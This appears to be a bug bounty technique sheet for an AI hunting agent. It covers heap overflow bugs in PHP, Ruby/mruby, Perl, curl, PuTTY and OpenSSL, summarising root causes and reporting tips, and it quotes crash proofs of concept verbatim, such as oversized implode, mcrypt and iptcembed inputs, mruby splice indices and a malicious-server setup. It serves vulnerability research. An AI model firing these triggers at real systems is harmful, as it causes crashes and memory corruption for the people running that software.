---
name: hunter-l3-heap-overflow
description: "Use when hunting Heap Overflow on a target. Loads the L3 technique sheet: Heap overflow bugs in bug bounty programs are almost never network-reachable in the classic sense — they cluster in **file parsers** (image, key, config), **language runtime C extensions** (PHP ext/*,"
domain: cybersecurity
subdomain: web
tags:
- web
- heap-overflow
- hunting
- l3
version: '1.0'
---

# Heap Overflow — Technique Sheet

## Overview

Heap overflow bugs in bug bounty programs are almost never network-reachable in the classic sense — they cluster in **file parsers** (image, key, config), **language runtime C extensions** (PHP ext/*, mruby, Perl regex, Ruby core), and **protocol clients** (curl, PuTTY, SSH). The dominant root cause across these 31 records is the **integer/size overflow → undersized allocation → oversized copy/write** chain, followed by unchecked lengths and wrong type-casts. They pay through Internet Bug Bounty-style programs (PHP, OpenSSL, curl, Perl, Ruby), runtime sandboxes (shopify-scripts/mruby), and embedded/protocol targets (Nintendo StreetPass, PuTTY, Stellar). Impact ceiling is memory corruption → RCE; the floor, reliably demonstrated with ASan, is DoS/SIGSEGV. ASan proof-of-crash (heap-buffer-overflow READ/WRITE of size N) is the standard accepted evidence.

## Distinct sub-patterns

### 1. Integer overflow in size computation → undersized allocation

**Endpoint shape / parameter:**
- `PHP implode()` — `implode($delimiter, $array)` (ext/standard/string.c)
- `PHP imagecreatefromgd2` — GD2 file header fields `ncx`/`ncy`
- libcurl — server-supplied `Content-Encoding: gzip` headers (old libz path)

**Payload that fired (verbatim, id=113120):**
```php
<?php
  $arr = [];
  for($i=0;$i<65536; ++$i) {
     $arr[$i]= "aa";
  }
  $text1 = str_repeat("ABCD", 16384);
  // Changing ABCD into other values will alter %eax and %ecx.
  $str = implode($text1, $arr);
?>
```

**Root cause:** `php_implode()` computes the result string length in `zend_string_alloc` with no overflow check — 65536 elements × delimiter length overflows the 32-bit length, allocating a small buffer then writing the full content into it. Same class: `_gd2GetHeader` multiplies chunk counts `ncx * ncy` (attacker-controlled from the file header) producing an undersized chunk-table allocation; libcurl's old-libz gzip path integer-overflows on oversized gzip headers served by a malicious server.

**Impact proven:** SIGSEGV with **attacker-controlled `%eax`/`%ecx`** at crash time (id=113120 — the repeated delimiter bytes land in registers at fault time, showing content control); GD2 crash in PHP 5.6.22 (id=143234); attacker-controlled heap overflow from a malicious server via gzip (id=2974850).

**Exemplars:** 113120, 143234, 2974850.

### 2. Signed/unsigned int truncation on length (size_t → int, 32-bit length fields)

**Endpoint shape / parameter:**
- `PHP mdecrypt_generic()` (ext/mcrypt) — data passed to decrypt
- `PHP mcrypt_generic()` (ext/mcrypt)
- PHP cURL extension
- PHP `iptcembed()`/`iptcparse()` — `iptcdata` param; the IPTC length field in a crafted image file

**Payload that fired (verbatim, id=146360):**
```php
<?php
	/* Data */
	ini_set('memory_limit',-1);

	$key = str_repeat('C', 32);
	$str = str_repeat('A', 0xffffffff);

	// $td = mcrypt_module_open('des', '', 'ecb', '');
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', ''); // block cipher (case 1)
	// $td = mcrypt_module_open('rijndael-256', ...
```
(id=112863 iptcembed PoC, verbatim):
```php
<?php

if(file_exists("heapyolo") == 0) {
    $fp = fopen("heapyolo", "wb");

    fwrite($fp, "\xff\xd8\xff\xe0\x00\x02\x00\xd9");
    for ($i = 0; $i < 4096; $i++) {
        fwrite($fp, str_repeat("A", 1024*1024));
    }

    fclose($fp);
}

iptcembed(str_repeat("A", 1024*1024), "heapyolo");
?>
```

**Root cause:** A signed-int overflow in `mdecrypt_generic()`'s `data_size` calculation makes it `emalloc` a small buffer, then `memcpy` up to `0xffffffff` bytes into it. In `mcrypt_generic`/`mdecrypt_generic` (php bugs 72551/72552) a size_t is cast to int, wrapping huge lengths negative. In `iptcembed`, the IPTC length field is a 32-bit int: a >4GB file overflows it, and the `M_APP0` switch case then overwrites heap memory with attacker-controlled values *and attacker-controlled length*.

**Impact proven:** SIGSEGV via memcpy heap overflow (146360); heap corruption (152398, 152399, 152400); on 32-bit PHP, iptcembed gives arbitrary heap overwrite with controlled data and length — memory corruption / code-execution potential (112863).

**Exemplars:** 112863, 146360, 152398/152400, 152399.

### 3. Unchecked attacker-supplied length field read into a copy

**Endpoint shape / parameter:**
- PuTTY `ssh1_login_process_queue` — `servkey`, `hostkey` length fields from a malicious SSH1 server
- PHP `exif_read_data` — crafted JPEG (EXIF size field)

**Payload:** id=630462: payload not stated (malicious SSH1 server sending a short key length). id=384214 (verbatim invocation): `USE_ZEND_ALLOC=0 ./php-7.2.7 -r '$exif = exif_read_data("http://dtf.pw/php727/poc/630/test000.jpeg"); var_dump($exif);'`

**Root cause:** No length validation before reading servkey/hostkey into fixed heap structures in PuTTY's SSH1 login state machine; `exif_read_data` copies an attacker-controlled size via `estrndup` with no bounds check.

**Impact proven:** ASan-confirmed heap-buffer-overflow in PuTTY from a malicious ssh1 server, "crashing putty with potential RCE" (630462); ASan heap-buffer-overflow READ of size 48, CVE-2018-14851, RCE claimed (384214).

**Exemplars:** 630462, 384214.

### 4. Off-by-past-end / wrong fixed-size indexing (level-indexed realloc, quantum buffers, decimal conversion)

**Endpoint shape / parameter:**
- PHP `finfo_open` (fileinfo) — malformed magic file lines with high nesting level; payload line (verbatim): `>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>q>>>>>>>>>`
- ImageMagick CLI — `magick <poc.tif> /dev/null` (malformed TIFF)
- PuTTY `puttygen -L` — crafted `.ppk` key file decimal field

**Root cause:** `file_check_mem` reallocs the level array by a fixed +20 but indexes at an arbitrary `level` taken from the magic file (`>` nesting depth), writing past the buffer (CVE-2015-8865). ImageMagick's TIFF decoder (ImportRGBQuantum/PushQuantumPixel) reads past the end of an undersized quantum buffer. `mp_get_decimal` reads past the end of a 16-byte heap buffer when converting a crafted key's decimal value.

**Impact proven:** Arbitrary memory write past the buffer via malformed magic file — segfault/ASan heap-buffer-overflow, "possibly remote code execution" (476179); ASan READ of size 1, 0 bytes right of a 248-byte region in ImageMagick 7.0.10-45 (1047086); ASan READ of size 8 plus invalid free in puttygen — crashes, infinite loops, or arbitrary code execution (482200).

**Exemplars:** 476179, 1047086, 482200.

### 5. Wrong width/length assumptions when decoding (multibyte, TIFF)

**Endpoint shape / parameter:** PHP mbstring `mb_convert_encoding`/regex paths — `mbc_to_code` functions for UTF32BE/UTF32LE/UTF16BE/UTF16LE (id=476168).

**Payload:** payload not stated.

**Root cause:** The `mbc_to_code` functions make incorrect length assumptions about the input buffer — they read a fixed 2/4 bytes regardless of how many bytes remain, reading past the allocation (CVE-2019-9023).

**Impact proven:** Confirmed buffer overflow leading to memory leakage and/or corruption.

**Exemplars:** 476168.

### 6. Regex compiler state-machine bugs (uninitialized variable / invalid code point / overrun)

**Endpoint shape / parameter:** PHP mbstring regex compilation — `regex pattern` parameter, i.e. any code path where a user-controlled regex is compiled (`mb_ereg`, `mb_eregi`); Perl `regcomp`.

**Payload that fired (verbatim, id=237915 mbstring):** the pattern `\700` — an octal escape larger than 0xff. Second mbstring bug in the same id: "regex triggering incorrect state transition in `parse_char_class()`" (payload not stated verbatim). Perl CVE-2018-18312/18313 payloads: "(not provided verbatim)".

**Root cause:** In `fetch_token()`, octal numbers larger than 0xff are mishandled, producing an invalid code point that causes an OOB write in `next_state_val()` during compilation (CVE-2017-9226). Separately, an incorrect state transition in `parse_char_class()` leaves a critical local variable **uninitialized until used as an index**, causing an OOB write in `bitset_set_range()` (CVE-2017-9228). Perl: heap-buffer-overflow write (`reg_node` overrun) in regcomp (CVE-2018-18312); and a heap-buffer-overflow **read** in `S_grok_bslash_N` (CVE-2018-18313).

**Impact proven:** mbstring OOB write/read during compilation, "potentially allowing remote exploitation in PHP mbstring" / "potentially allowing remote code execution" (237915). Perl: potential RCE (510887) and potential information leak of "secret variables or source codes" from memory (510888).

**Exemplars:** 237915 (both CVEs), 510887, 510888.

### 7. Regex engine OOB read against short buffers (anchored match + UTF-8)

**Endpoint shape / parameter:** Perl `regcomp`-family — regex match anchored against a string containing UTF-8 before a fixed offset.

**Payload:** payload not stated.

**Root cause:** When `Perl_re_intuit_start()` anchors a match at a fixed offset, `memcmp()` can read past the end of the allocated memory.

**Impact proven:** ASan-confirmed heap-buffer-overflow READ of size 61; adjacent-memory disclosure or DoS; fixed in Perl 5.26.0 (233440).

**Exemplars:** 233440.

### 8. Missing return-value / length validation on crypto APIs → wild memcpy

**Endpoint shape / parameter:**
- PHP `openssl_seal()` — PEM certificate parameter
- OpenSSL `BN_bn2dec()` — oversized BIGNUM (from a large certificate/CRL)
- OpenSSL `MDC2_Update()`/`EVP_DigestUpdate()` — very large input after partial-block `EVP_EncryptUpdate()`

**Payload:** id=248609's PoC script is truncated in the record (reads a PEM file and calls `openssl_seal`); payload not stated in full.

**Root cause:** PHP's `zif_openssl_seal()` does not validate the return value/lengths from `EVP_SealInit()`; an invalid key length of -1 is passed to `add_next_index_stringl()`, causing a **wild memcpy** (negative-size-param under ASan; CVE-2017-11144). `BN_bn2dec()` doesn't check `BN_div_word()`'s return, enabling OOB write on overly large BIGNUMs (CVE-2016-2182). `MDC2_Update()`'s length check itself can overflow with input comparable to SIZE_MAX (CVE-2016-6303).

**Impact proven:** Crafted PEM aborted PHP under ASan — immediate DoS of the HTTP server, potential code execution with a malicious cert (248609). 221788 and 221783 were judged **theoretical only** (see Gotchas) — TLS record limits reject oversized certificates before parsing, and SIZE_MAX-scale input is impractical.

**Exemplars:** 248609 (real), 221788, 221785 (theoretical-class).

### 9. VM/interpreter stack and splice bugs (mruby / Ruby)

**Endpoint shape / parameter:**
- mruby `Array#[]=` via `mrb_ary_splice` — huge head index with a length argument
- mruby VM `OP_R_BREAK` — `break` out of a lambda inside rescue
- Ruby `Marshal.load` on malformed data
- Ruby float parsing — `untrusted_data.to_f` / `JSON.parse` on crafted strings

**Payload that fired (verbatim):**
```ruby
# id=197719
ary = Array.new(1024)
ary[0x7ffffffffffffc00,1024] = Array.new(1024)
```
```ruby
# id=295380
def z
	e Array = a rescue 
	lambda { yield }
end

z { break } 

Array[]
```
```ruby
# id=1940002
Marshal.load(ARGF.read)
```

**Root cause:** The prior fix for `mrb_ary_splice` only checks the array size, so a large head value (`0x7ffffffffffffc00`) lets `ary_fill_with_nil` write past the heap buffer (write size 9223372036854765361). `OP_R_BREAK` reads past the end of the value stack when breaking out of a lambda/rescue. Malformed Marshal data triggers heap-buffer-overflow in `gc_writebarrier_incremental` (Ruby 3.2.2). Float conversion of crafted strings overflows the heap because the length is not bounded.

**Impact proven:** SIGSEGV in `ary_fill_with_nil` (197719); ASan-verified heap-buffer-overflow crash of mirb (295380); ASan heap-buffer-overflow on Ruby 3.2.2, crash/DoS (1940002); DoS via segfaults and possibly arbitrary code execution from float parsing (499).

**Exemplars:** 197719, 295380, 1940002, 499.

### 10. Protocol client trusting a server's refusal (TFTP blksize)

**Endpoint shape / parameter:** curl TFTP client — `blksize` option; server ignores the OACK negotiation.

**Payload that fired (verbatim, id=684603):**
```
curl --tftp-blksize 8192 tftp://9.1.9.1/data.bin --output data.bin
```

**Root cause:** CVE-2019-5482 — curl fails to fall back to the default 512-byte block size when a TFTP server ignores the blksize request and sends no OACK, so the receive buffer (sized for 8192) is written with the wrong framing.

**Impact proven:** Demonstrated: file silently truncated to 512 bytes with curl exiting 0 (no error surfaced); heap-overflow risk present but not exploited in the report. Note the *silent misbehavior* was itself the accepted proof of the negotiation bug.

**Exemplars:** 684603.

### 11. Config/file parser OOB reads (low severity but valid)

**Endpoint shape / parameter:** stellar-core TOML config parser — `cpptoml::parser::consume_whitespace`, consuming the node's config file.

**Payload:** payload not stated.

**Root cause:** Out-of-bounds read of size 1 in `consume_whitespace` while parsing config input.

**Impact proven:** ASan-confirmed heap-buffer-overflow READ of size 1, rated low severity because the parser only consumes a locally-controlled config file (240659). Similarly, Nintendo's Swapnote parser heap overflow was reachable **via StreetPass** — network-delivered userland RCE on the 3DS (923240), impact stated in title with no detail disclosed.

**Exemplars:** 240659, 923240.

### 12. Miscellaneous runtime integer overflows (bug-report-only, no PoC)

Several IBB reports were accepted with root-cause only, no local PoC: PHP `json_encode()`/`json_decode()` integer overflow → heap overflow (php bug #72275, id=146182); PHP GD `gdImagePaletteToTrueColor()` integer overflow (php bug #72446, id=147125, **bounty $500**). These show that in language-runtime programs, a credible root-cause analysis citing the upstream bug can be sufficient for payout even without an attached crash PoC.

## Bypass / chain notes

- **Registers as a control signal:** In the implode PoC (113120), the reporter deliberately notes the delimiter bytes change `%eax`/`%ecx` at fault time — demonstrating attacker content flows into register state. Frame your PoC to show controllability, not just crash.
- **Server-side attacker as trigger:** curl gzip (2974850) and PuTTY SSH1 (630462) both use a *malicious server* as the delivery vehicle — for client-target classes, you control the far end; run a hostile server rather than crafting files.
- **Format-chaining:** 112863's iptcembed PoC writes a minimal JPEG magic (`\xff\xd8\xff\xe0\x00\x02\x00\xd9`) and pads to >4GB to trip the 32-bit length wrap — file-format header + oversized body is a recurring construction (also the >4GB approach in 146360 via `str_repeat('A', 0xffffffff)` + `memory_limit=-1`).
- **No chaining was present in any record** (`chain: (none)` on all 31) — these bugs were reported standalone. Sandbox targets like shopify-scripts implicitly represent a chain step (escape prerequisite) but no record documents the next step.

## Gotchas / what NOT to do

- **Theoretical-only bugs get marginal credit or none.** OpenSSL MDC2_Update (221785, CVE-2016-6303) requires input comparable to SIZE_MAX and was judged impractical; BN_bn2dec (221788, CVE-2016-2182) is unreachable via TLS because record limits reject oversized certificates before parsing. Before reporting, ask whether any real input path can deliver the required size — protocol-level size limits kill BIGNUM/length bugs.
- **Attack-surface scope downgrades severity.** stellar-core's cpptoml OOB read (240659) was confirmed but rated low because the parser only consumes a local config file. An ASan crash alone doesn't set severity — reachability does.
- **Prior fixes may be incomplete.** 197719 explicitly bypassed a previous `mrb_ary_splice` fix: the fix checked array size but not a large head index. When retesting patched code, vary the *other* operand (head vs. length).
- **32-bit vs 64-bit matters.** The strongest iptcembed (112863) and implode (113120) impacts were framed for 32-bit PHP; on 64-bit the same overflows usually only crash. State the target platform precisely.
- **ASan framing matters for exif bugs:** 384214 ran with `USE_ZEND_ALLOC=0` to disable PHP's own allocator so ASan sees the overflow — without it, Zend MM may mask the bug.
- **RCE claims without proof:** 384214 "claimed" RCE and 1047086 noted "RCE not verified." DoS-level proof was still accepted; don't overclaim, but do assert the memory-corruption potential honestly.

## Real-world impact examples

- **Attacker-controlled heap overwrite on 32-bit PHP** via `iptcembed` >4GB length wrap (112863) — controlled values *and* length.
- **Wild memcpy / immediate HTTP-server DoS** from a crafted PEM cert through `openssl_seal()` (248609, CVE-2017-11144).
- **Malicious SSH1 server heap-overflows PuTTY** — ASan-confirmed, potential RCE (630462).
- **Malicious server heap overflow in curl** via oversized gzip headers with `Content-Encoding: gzip` (2974850).
- **Remote regex compilation RCE path** in PHP mbstring from a 4-character pattern `\700` (237915, CVE-2017-9226/9228) — among the smallest payloads in the set.
- **Userland RCE on Nintendo 3DS** via StreetPass-delivered Swapnote parser overflow (923240).
- **Silent data corruption in curl TFTP**: truncated download, exit code 0, no error (684603).
- **Arbitrary write via a one-line magic file** `>>>>…q…` in fileinfo (476179, CVE-2015-8865).